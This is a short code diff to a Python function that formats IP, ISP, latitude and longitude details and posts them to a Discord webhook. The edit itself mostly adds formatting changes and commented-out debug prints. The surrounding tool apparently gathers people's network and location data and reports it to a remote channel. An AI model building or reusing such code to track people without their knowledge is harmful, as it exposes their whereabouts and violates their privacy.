@@ -55,6 +55,7 @@ def discord_sender(url, msg_type, content):
                 }
             ]
         }
+        #print("sending ip info to discord",info_message)
         requests.post(url, json=info_message, timeout=10)
 
     if msg_type == 'ip_info':
@@ -88,20 +89,24 @@ def discord_sender(url, msg_type, content):
                         {
                             "name": "ISP",
                             "value": json_content['isp']
+                        },   
+                        {
+                            "name": "Latitude",
+                            "value": str(json_content['latitude'])
                         },
                         {
-                            "name": "latitude",
-                            "value": json_content['latitude']
-                        },
-                        {
-                            "name": "longitude",
-                            "value": json_content['longitude']
-                        },
+                            "name": "Longitude",
+                            "value": str(json_content['longitude'])
+                        }
                     ]
                 }
             ]
         }
-        requests.post(url, json=ip_info_msg, timeout=10)
+        #print("sending ip info to discord",ip_info_msg)
+        response = requests.post(url, json=ip_info_msg, timeout=10)
+        #print("Response:", response.text)
+        #print("Status Code:", response.status_code)
+
 
     if msg_type == 'location':
         location_msg = {
